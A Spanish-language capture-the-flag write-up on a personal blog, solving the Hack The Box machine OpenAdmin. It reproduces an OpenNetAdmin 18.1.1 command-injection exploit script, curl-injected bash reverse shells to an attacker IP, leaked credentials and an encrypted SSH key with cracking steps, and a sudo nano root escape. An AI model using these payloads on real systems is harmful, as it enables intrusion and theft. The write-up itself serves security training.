@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="Linux, CTF, OpenAdminNet Exploitation, id_rsa Cracking, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina OpenAdmin "/>
+<meta property="og:url" content="https://alimh0x.github.io/htb-openadmin.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.171 Host is up, received user-set (0.29s latency). PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Detectamos versión y servicio de los puertos abiertos: nmap …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-11-01T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina OpenAdmin ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.171 Host is up, received user-set (0.29s latency). PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Detectamos versión y servicio de los puertos abiertos: nmap …">
+
+        <title>Resolución de máquina OpenAdmin  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="https://alimh0x.github.io/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       https://alimh0x.github.io
+                                    >Home</a>
+                                </li>
+                                <li ><a href="https://alimh0x.github.io/categories.html">Categories</a></li>
+                                <li ><a href="https://alimh0x.github.io/tags.html">Tags</a></li>
+                                <li ><a href="https://alimh0x.github.io/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="https://alimh0x.github.io/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="https://alimh0x.github.io/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="https://alimh0x.github.io/htb-openadmin.html">
+                Resolución de máquina OpenAdmin
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_openadmin/openadmin_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.171
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up, received user-set (0.29s latency).
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sC -sV -p22,80 10.10.10.171
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up (0.38s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+
+<p>Comenzamos realizando fuzzing de directorios y encontramos los siguientes:</p>
+<div class="highlight"><pre><span></span><code>gobuster dir -u http://10.10.10.171 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class="m">50</span>
+</code></pre></div>
+
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-1.jpg"></p>
+<p>Nos ponemos a navegar cada uno. Nos damos cuenta que se está realizando Virtual Hosting, por lo que agregamos <em>openadmin.htb</em>. a nuestro /etc/hosts. Dentro de <strong>music</strong>, vemos un botón de <strong>login</strong>.</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-2.jpg"></p>
+<p>Nos redirige a <strong>/ona</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-3.jpg"></p>
+<p>Si accedemos a <em>DNS Domains</em> vemos:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-4.jpg"></p>
+<p>También nos muestra que estamos ante la <strong>versión 18.1.1</strong> y nos aclara que no es la última. Si hacemos click <em>Download</em> vemos que estamos ante un <strong>OpenNetAdmin</strong>.</p>
+<p>Si buscamos exploits para esa versión, vemos que existen:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-5.jpg"></p>
+<h1>Intrusión - Metasploit</h1>
+<p>Seleccionamos el módulo <em>exploit/unix/webapp/opennetadmin_ping_cmd_injection</em> y lo configuramos de la siguiente forma:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-6.jpg"></p>
+<p>Lo corremos y obtenemos una Shell como <strong>www-data</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-7.jpg"></p>
+<h1>Intrusión - Manual</h1>
+<p>Vamos a usar el otro exploit que nos trae searchsploit. Es el siguiente:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span>
+<span class="c1"># Date: 2019-11-19</span>
+<span class="c1"># Exploit Author: mattpascoe</span>
+<span class="c1"># Vendor Homepage: http://opennetadmin.com/</span>
+<span class="c1"># Software Link: https://github.com/opennetadmin/ona</span>
+<span class="c1"># Version: v18.1.1</span>
+<span class="c1"># Tested on: Linux</span>
+
+<span class="c1"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span>
+<span class="c1"># Date: 2019-11-19</span>
+<span class="c1"># Exploit Author: mattpascoe</span>
+<span class="c1"># Vendor Homepage: http://opennetadmin.com/</span>
+<span class="c1"># Software Link: https://github.com/opennetadmin/ona</span>
+<span class="c1"># Version: v18.1.1</span>
+<span class="c1"># Tested on: Linux</span>
+
+<span class="c1">#!/bin/bash</span>
+
+<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="k">while</span> true<span class="p">;</span><span class="k">do</span>
+ <span class="nb">echo</span> -n <span class="s2">&quot;</span>$<span class="s2"> &quot;</span><span class="p">;</span> <span class="nb">read</span> cmd
+ curl --silent -d <span class="s2">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;</span><span class="si">${</span><span class="nv">cmd</span><span class="si">}</span><span class="s2">;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL</span><span class="si">}</span><span class="s2">&quot;</span> <span class="p">|</span> sed
+ -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span> <span class="p">|</span> tail -n +2 <span class="p">|</span> head -n -1
+<span class="k">done</span>
+</code></pre></div>
+
+<p>Vamos a usar el <em>curl</em> tal cual se muestraá, modificando las variables url por http://10.10.10.171/ona/ y cmd por, por ejemplo, <em>id</em> o <em>whoami</em>:</p>
+<div class="highlight"><pre><span></span><code>curl --silent -d <span class="s2">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;id;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="s2">&quot;http://10.10.10.171/ona&quot;</span> <span class="p">|</span> sed -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span> <span class="p">|</span> tail -n +2 <span class="p">|</span> head -n -1
+</code></pre></div>
+
+<p>Vemos que estamos pudiendo ejecutar comandos:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-8.jpg"></p>
+<p>Vamos a entablar una Reverse Shell ejecutando el comando <em>bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.9/1234 0&gt;%261'</em>:</p>
+<div class="highlight"><pre><span></span><code>curl --silent -d <span class="s2">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;bash -c &#39;bash -i &gt;%26 /dev/tcp/10.10.14.9/1234 0&gt;%261&#39;;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="s2">&quot;http://10.10.10.171/ona/&quot;</span> <span class="p">|</span> sed -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span> <span class="p">|</span> tail -n +2 <span class="p">|</span> head -n -1
+</code></pre></div>
+
+<p>Nos ponemos a la escucha y obtenemos la Shell:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-9.jpg"></p>
+<p>Hacemos un tratamiento de la TTY. Vemos que existen otros dos usuarios, <strong>jimmy</strong> y <strong>joanna</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-10.jpg"></p>
+<h1>Escalación de privilegios</h1>
+<h2>www-data --&gt; jimmy</h2>
+<p>Nos ponemos a navegar los directorios. Dentro de <strong>/opt/ona/www</strong>, vemos el archivo <strong>config.inc.php</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-11.jpg"></p>
+<p>Dentro de este archivo, vemos las siguientes líneas:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-12.jpg"></p>
+<p>Si leemos el archivo <strong>/opt/ona/www/local/config/database_settings.inc.php</strong> vemos lo siguiente:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-13.jpg"></p>
+<p>Tenemos las credenciales para conectarse a la BD en texto claro.</p>
+<div class="highlight"><pre><span></span><code>&#39;db_type&#39; =&gt; &#39;mysqli&#39;,
+&#39;db_host&#39; =&gt; &#39;localhost&#39;,
+&#39;db_login&#39; =&gt; &#39;ona_sys&#39;,
+&#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;,
+&#39;db_database&#39; =&gt; &#39;ona_default&#39;,
+</code></pre></div>
+
+<p>Nos conectamos de la siguiente manera:</p>
+<div class="highlight"><pre><span></span><code>mysql -u ona_sys -D ona_default -p
+</code></pre></div>
+
+<p>Listamos la tabla <strong>users</strong> pero no vemos nada relevante pensando en tener acceso como alguno de los usuarios que tenemos identificados:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-14.jpg"></p>
+<p>Hacemos un pequeño diccionario que contiene los usuarios jimmy y joanna, y validamos la password que conseguimos con hydra</p>
+<div class="highlight"><pre><span></span><code>hydra -L users.txt -p <span class="s1">&#39;n1nj4W4rri0R!&#39;</span> <span class="m">10</span>.10.10.171 ssh
+</code></pre></div>
+
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-15.jpg"></p>
+<p>La contraseña corresponde al usuario <strong>jimmy</strong>, así que nos logueamos.</p>
+<h2>jimmy --&gt; joanna</h2>
+<p>Para ayudarnos con la enumeración del sistema, vamos a utilizar <strong>LinEnum</strong>. Lo pasamos a la máquina víctima y lo ejecutamos. Como cosas interesantes, vemos que pertenece al grupo internal, y también vemos el puerto <strong>52846</strong> a la escucha localmente:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-16.jpg"></p>
+<p>A los otros puertos los tenemos identificados, pero a este no. Si nos dirigimos a la ruta <em>/etc/apache2/sites-enabled</em> vemos los archivos <em>openadmin.conf</em> y <em>internal.conf</em>. El primero hace referencia al sitio que habíamos encontrado (escuchando en el puerto 80). El admin es <strong>jimmy</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-17.jpg"></p>
+<p>El otro está escuchando en el puerto 52864 y el admin es <strong>joanna</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-18.jpg"></p>
+<p>Vemos también que el <strong>DocumentRoot</strong> es la ruta <strong>/var/www/internal</strong>. Si nos dirigimos a esa ruta, vemos los siguientes archivos:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-19.jpg"></p>
+<p>Abrimos el archivo <em>index.php</em> y encontramos un hash SHA512 asociado al usuario jimmy:</p>
+<div class="highlight"><pre><span></span><code><span class="n">jimmy</span><span class="o">:</span><span class="mi">00</span><span class="n">e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1</span><span class="w"></span>
+</code></pre></div>
+
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-20.jpg"></p>
+<p>Si abrimos el <em>main.php</em><em> vemos que como output tenemos el </em>id_rsa<em> de </em>joanna*:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-21.jpg"></p>
+<p>Por lo tanto, vamos a hacer un curl de la siguiente manera:</p>
+<div class="highlight"><pre><span></span><code>curl http://127.0.0.1:52846/main.php
+</code></pre></div>
+
+<p>Obtenemos la id_rsa:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Don&#39;t forget your &quot;ninja&quot; password<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+Click here to logout <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;logout.php&quot;</span> <span class="na">tite </span><span class="o">=</span> <span class="s">&quot;Logout&quot;</span><span class="p">&gt;</span>Session
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Vemos que está encriptada, por lo que necesitaremos obtener la contraseña. Nos guardamos esto en un archivo id_rsa en nuestra PC atacante y lo pasamos a un formato que John The Ripper entienda utilizando <strong>ssh2john</strong>:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-22.jpg"></p>
+<p>Guardamos el output en un archivo hashes.txt y vamos a tratar de obtener la contraseña:</p>
+<div class="highlight"><pre><span></span><code>john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes.txt 
+</code></pre></div>
+
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-23.jpg"></p>
+<p>Nos conectamos:</p>
+<div class="highlight"><pre><span></span><code>ssh -i id_rsa joanna@10.10.10.171
+</code></pre></div>
+
+<p>Desde aquí vemos el primer flag:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-24.jpg"></p>
+<h2>joanna --&gt; root</h2>
+<p>Como joanna, si ejecutamos <em>sudo -l</em> vemos que podemos ejecutar <em>/bin/nano /opt/priv</em> como root sin necesidad de especificar contraseña:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-25.jpg"></p>
+<p>Apoyándonos en GTFOBins vemos que podemos ejecutarlo de la siguiente manera:</p>
+<div class="highlight"><pre><span></span><code>nano
+Ctrl+R Ctrl+X
+reset<span class="p">;</span> sh <span class="m">1</span>&gt;<span class="p">&amp;</span><span class="m">0</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">0</span>
+id
+whoami
+</code></pre></div>
+
+<p>Estamos pudiendo ejecutar comandos como root:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-26.jpg"></p>
+<p>Vamos a ejecutar lo siguiente para obtener una Reverse Shell:</p>
+<div class="highlight"><pre><span></span><code>bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.9/443 0&gt;&amp;1&#39;</span>
+</code></pre></div>
+
+<p>Desde aquí vemos la siguiente flag:</p>
+<p><img alt="openadmin" src="images/images_htb_openadmin/htb_openadmin-27.jpg"></p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-11-01T00:00:00-03:00">vie 01 noviembre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="https://alimh0x.github.io/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="https://alimh0x.github.io/tags.html#ctf-ref">CTF
+                    <span class="superscript">20</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#id_rsa-cracking-ref">id_rsa Cracking
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#linux-ref">Linux
+                    <span class="superscript">14</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#openadminnet-exploitation-ref">OpenAdminNet Exploitation
+                    <span class="superscript">1</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="https://alimh0x.github.io/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
